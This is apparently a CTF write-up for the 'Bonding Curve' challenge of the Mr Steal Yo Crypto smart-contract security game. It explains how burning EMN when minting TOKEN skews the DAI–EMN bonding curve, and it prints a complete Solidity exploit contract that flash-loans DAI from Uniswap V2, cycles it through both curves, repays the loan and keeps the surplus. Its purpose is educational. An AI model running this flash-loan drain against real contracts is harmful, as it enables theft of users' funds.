---
title: "Mr Steal Yo Crypto — Bonding Curve"
date: 2023-07-22
draft: false
description: "CTF - 11"
tags: ["CTF"]
series: ["CTF"]
series_order: 11
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #11 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real world exploits.

Created by [@0xToshii](https://twitter.com/0xToshii).

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement).

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/freeze/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Bonding Curve

[Redacted] have released two token contracts for their upcoming game: EMN & TOKEN, which allow you to mint based on their respective bonding curves.

DAI is used to mint EMN, and EMN is used to mint TOKEN.

Your task is to steal at least 50,000 DAI. You start with no tokens.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/bonding-curve)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/11-bonding-curve.sol)

## Review of the contracts

First, I didn’t know a lot about bonding curve before this challenge. Here are some resources that helped me overcome my lack of knowledge:

- [https://medium.com/@simondlr/bancors-smart-tokens-vs-token-bonding-curves-a4f0cdfd3388](https://medium.com/@simondlr/bancors-smart-tokens-vs-token-bonding-curves-a4f0cdfd3388)
- [https://medium.com/@simondlr/a-bonded-curation-community-247f14a6de04](https://medium.com/@simondlr/a-bonded-curation-community-247f14a6de04)
- [https://billyrennekamp.medium.com/converting-between-bancor-and-bonding-curve-price-formulas-9c11309062f5](https://billyrennekamp.medium.com/converting-between-bancor-and-bonding-curve-price-formulas-9c11309062f5)
- [https://blog.relevant.community/how-to-make-bonding-curves-for-continuous-token-models-3784653f8b17?gi=c7d2204ca921](https://blog.relevant.community/how-to-make-bonding-curves-for-continuous-token-models-3784653f8b17?gi=c7d2204ca921)
- [https://blog.relevant.community/bonding-curves-in-depth-intuition-parametrization-d3905a681e0a?gi=4ec27f766b1d](https://blog.relevant.community/bonding-curves-in-depth-intuition-parametrization-d3905a681e0a?gi=4ec27f766b1d)
- [https://articles.linumlabs.com/articles/bonding-curves-the-what-why-and-shapes-behind-it](https://articles.linumlabs.com/articles/bonding-curves-the-what-why-and-shapes-behind-it)
- [https://www.desmos.com/calculator/8gxacjujal](https://www.desmos.com/calculator/8gxacjujal)
- [https://www.desmos.com/calculator/ro8jpt2ud2](https://www.desmos.com/calculator/ro8jpt2ud2)
- [https://github.com/relevant-community/bonding-curve](https://github.com/relevant-community/bonding-curve)
- [https://github.com/bitsofether/awesome-bonding](https://github.com/bitsofether/awesome-bonding)
- [https://wiki.aavegotchi.com/en/curve](https://wiki.aavegotchi.com/en/curve)

## EminenceInterface.sol
Inside this contract we have two interfaces that will ease our calls for buying and selling tokens.

## EminenceCurrencyHelpers.sol
We have a little bit of everything, we got some interfaces (IERC20, BondingCurve), a library (SafeMath), and some contracts (ERC20, ERC20Detailed, ContinuousToken). For generalizing, ContinuousToken is the contract core logic of the protocol. The contract is in charge of how many tokens to send if a user wants to buy or sell. He will keep the current point position on the bonding curve.

## BancorBondingCurve.sol
This contract represents the bonding curve. The contract will be deployed independently.

## EminenceCurrencyBase.sol
This contract handles bonding of DAI <-> EMN. It inherits the ContinuousToken and ERC20Detailed contracts. We will deal with it for buying or selling EMN tokens. Something to notice is that for selling EMN tokens we are burning the token. Just a reminder, the contract is the EMN token.

## EminenceCurrency.sol
The last contract handles bonding of EMN <-> Token. It inherits the ContinuousToken and ERC20Detailed contracts. We will deal with it for buying or selling TOKEN tokens. Just a reminder, the contract is the TOKEN token. We can again notice that for selling TOKEN tokens we are burning the token. The difference between EminenceCurrencyBase and EminenceCurrency is at [L78](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/src/bonding-curve/EminenceCurrency.sol#L78) for buying TOKEN. In EminenceCurrencyBase, we are sending DAI, but here we are calling the claim() function of EMN. Let’s see what it means.

## Claim() and test file
The requirement looks strange, but don’t worry. Inside the [test](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/11-bonding-curve.sol#L118), we can see that the admin allows EminenceCurrency to be gamemasters. After we pass the requirement, we burn the EMN token. What? So for buying TOKEN, we are burning EMN. But EMN is also used on another bonding curve (DAI <-> EMN). We will check the buy() of EminenceCurrencyBase. Inside buy(), we are calling _buy() of ContinuousToken. Then inside _buy(), we go to _continuousMint(), which also calls calculateContinuousMintReturn, which is calling CURVE.calculatePurchaseReturn (the contract BancorBondingCurve deployed) ^^.

I’m still not at ease with the implementation of the bonding curve. I want to try if burning the EMN token is causing a vulnerability.

Here is a graph to have a clearer vision:

![Graph](https://cdn-images-1.medium.com/freeze/max/800/1*jDkOsqFv_FwI-zvsQV0ifg.png)

## Exploit the vulnerability
I did a quick test and effectively, the vulnerability seems to be due to the burning of EMN when buying TOKEN:

1. Borrow `n` amount of DAI via a Flashloan via uniswapv2
2. Buy `z` amount of EMN token via buy() (we are sending DAI into the contract)
3. Then we buy `x` TOKEN via buy(), this time we are burn EMN token (`z`/2 amount)
4. Now, if we sell EMN the remaining amount (`z`/2). Do we get `n`/2 of DAI or more?

```solidity
contract Exploit{

    address owner;
    IUniswapV2Pair uniPair; // DAI-USDC trading pair
    IWETH weth;
    Token usdc;
    Token dai;
    IEminenceCurrency eminenceCurrencyBase;
    IEminenceCurrency eminenceCurrency;

    constructor(address _dai, address _eminenceCurrencyBase, address _eminenceCurrency, address _uniPair ){
        owner = msg.sender;
        dai = Token(_dai);
        eminenceCurrencyBase = IEminenceCurrency(_eminenceCurrencyBase);
        eminenceCurrency = IEminenceCurrency(_eminenceCurrency);
        uniPair = IUniswapV2Pair(_uniPair);
    }

    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
        uint256 daiAmount = dai.balanceOf(address(this));
        console.log("balance dai of exploit: ", daiAmount);

        dai.approve(address(eminenceCurrencyBase), type(uint).max);
        eminenceCurrencyBase.approve(address(eminenceCurrency), type(uint).max);

        // --exploit swaps all DAI to EMN, convert 1/2 EMN to TOKEN
        eminenceCurrencyBase.buy(daiAmount, 0);
        uint256 eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));

        uint256 amount_ = eminenceCurrencyBaseAmount / 2;
        eminenceCurrency.buy(amount_, 0);

        // With the convert we just burn the supply of EMN so for the first bonding curve if we sell, we will gain higher than it supposed to be
        eminenceCurrencyBase.sell(amount_, 0);
        console.log("balance dai of exploit: ", dai.balanceOf(address(this)));

        // Sell the remaining TOKEN and then sell EMN
        uint256 eminenceCurrencyAmount = eminenceCurrency.balanceOf(address(this));
        eminenceCurrency.sell(eminenceCurrencyAmount, 0);
        eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));
        eminenceCurrencyBase.sell(eminenceCurrencyBaseAmount, 0);

        console.log("balance dai of exploit: ", dai.balanceOf(address(this)));
        console.log("amount to repay: ", (amount1Out * 103 / 100) + 1); // Yeah, the premium is a bit too high

        dai.transfer(address(uniPair), (amount1Out * 103 / 100) + 1);
        dai.transfer(owner, dai.balanceOf(address(this)));
        console.log("balance dai of attacker: ", dai.balanceOf(address(owner)));
    }

    function pwn() external {
        uniPair.swap(0, 999_999e18, address(this), new bytes(1));
    }
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/11-bonding-curve.sol).

I can’t say that I really solve the challenge, because I’m not mastering the exploit. Maybe it’s easier or we can optimize my exploit. In the end, I passed the challenge!

## Acknowledgment
Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.